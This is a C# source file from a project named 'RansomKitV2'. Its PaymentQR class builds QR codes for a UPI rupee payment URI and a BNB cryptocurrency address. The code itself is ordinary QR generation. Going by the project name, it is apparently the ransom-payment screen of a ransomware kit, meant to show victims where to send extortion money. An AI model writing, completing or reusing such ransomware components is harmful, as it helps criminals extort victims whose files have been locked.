using System;
using System.Drawing;
using System.Drawing.Drawing2D;
using QRCoder;

namespace RansomKitV2
{
    internal static class PaymentQR
    {
        public static Bitmap? Generate(string payload, int targetSize = 220)
        {
            try
            {
                using var gen = new QRCodeGenerator();
                using var data = gen.CreateQrCode(payload, QRCodeGenerator.ECCLevel.Q);
                using var qr = new QRCode(data);

                Bitmap raw = qr.GetGraphic(5, Color.Black, Color.White, drawQuietZones: true);
                return Resize(raw, targetSize);
            }
            catch { return null; }
        }

        public static string BuildUpiUri(string pa, string pn, decimal amount, string note)
        {
            return "upi://pay?pa=" + Uri.EscapeDataString(pa)
                 + "&pn=" + Uri.EscapeDataString(pn)
                 + "&am=" + amount.ToString("F2", System.Globalization.CultureInfo.InvariantCulture)
                 + "&cu=INR"
                 + "&tn=" + Uri.EscapeDataString(note);
        }

        public static string BuildBnbUri(string address)
        {
            return address;
        }

        private static Bitmap Resize(Bitmap src, int targetSize)
        {
            if (src.Width == targetSize && src.Height == targetSize) return src;

            var dst = new Bitmap(targetSize, targetSize);
            using var g = Graphics.FromImage(dst);
            g.InterpolationMode = InterpolationMode.NearestNeighbor;
            g.PixelOffsetMode = PixelOffsetMode.Half;
            g.Clear(Color.White);
            g.DrawImage(src, 0, 0, targetSize, targetSize);

            src.Dispose();
            return dst;
        }
    }
}